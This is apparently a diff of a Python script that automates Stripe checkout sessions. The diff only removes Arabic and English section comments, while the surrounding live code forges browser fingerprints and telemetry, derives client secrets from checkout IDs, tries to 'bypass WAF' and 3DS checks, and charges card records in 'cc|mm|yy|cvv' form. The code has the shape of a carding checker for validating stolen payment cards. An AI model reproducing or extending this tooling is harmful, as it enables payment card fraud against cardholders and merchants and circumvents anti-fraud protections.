@@ -21,7 +21,6 @@ class C:
 def log(t, color=C.CYN):
     print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {t}{C.R}")
 
-# --- 1. فك تشفير الـ FID ---
 def decode_fid(fid_or_url: str) -> dict[str, Any]:
     if not fid_or_url: return {}
     raw = str(fid_or_url).strip()
@@ -52,7 +51,6 @@ def decode_fid(fid_or_url: str) -> dict[str, Any]:
         if "client_secret" not in data: data["client_secret"] = f"{session_id}_secret_{b64_str}"
     return data
 
-# --- 2. أدوات الـ 3DS ---
 def b64e(b): return base64.b64encode(b).decode().rstrip("=").replace("+","-").replace("/","_")
 def b64d(s):
     s = s.replace("-","+").replace("_","/"); s += "="*(-len(s)%4)
@@ -93,7 +91,6 @@ def find_source_recursive(obj, depth=0, max_depth=12):
             if r: return r
     return None
 
-# --- 3. الكلاس الأساسي ---
 class StripeSession:
     def __init__(self, url):
         self.url = url.strip()
@@ -128,7 +125,6 @@ class StripeSession:
         self.session = AsyncSession(impersonate="chrome", timeout=30)
         
         try:
-            # Telemetry
             tel = {"v":2,"tag":"5.6.8_js_fp","src":"checkout-inner-live-v3","a":{"a": self.pk, "b": f"https://checkout.stripe.com/c/pay/{self.cs}","c": 24, "d": "1920x1080", "e": False, "f": "en-US", "g": "Win32","h": UA, "i": -300, "j": False, "k": 8, "l": 8}}
             r_tel = await self.session.post("https://m.stripe.com/6", json=tel, headers={"content-type":"application/json","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA})
             if r_tel.status_code == 200:
@@ -136,7 +132,6 @@ class StripeSession:
                 for k in ("muid","sid","guid"):
                     if j_tel.get(k): self.tracking[k] = j_tel[k]
 
-            # Init
             body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
             r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init", headers=self._hdrs(), data=body)
             j = r.json()
@@ -225,7 +220,6 @@ class StripeSession:
             except Exception as e: last_err = {"error": {"message": str(e)[:80]}}
         return last_err or {"error": {"message": "all failed"}}, "ALL_FAILED"
 
-    # --- 4. تجاوز الـ WAF (الفكرة اللي إنت طلبتها) ---
     async def _handle_waf(self, conf, pi):
         na = pi.get("next_action") or conf.get("next_action") or {}
         use_sdk = na.get("use_stripe_sdk") or {}
@@ -251,7 +245,6 @@ class StripeSession:
 
         return {"success": False, "status": "WAF_FAILED", "message": "Could not bypass WAF"}
 
-    # --- 5. معالجة الـ 3DS ---
     async def _handle_3ds(self, conf, card):
         pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
         na = pi.get("next_action") or conf.get("next_action") or {}
@@ -306,7 +299,6 @@ class StripeSession:
                 
         return {"success": False, "status": "REQUIRES_ACTION", "message": "3DS Challenge/OTP Required"}
 
-    # --- 6. الدالة الرئيسية للشحن ---
     async def charge(self, card):
         res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
         t0 = time.time()
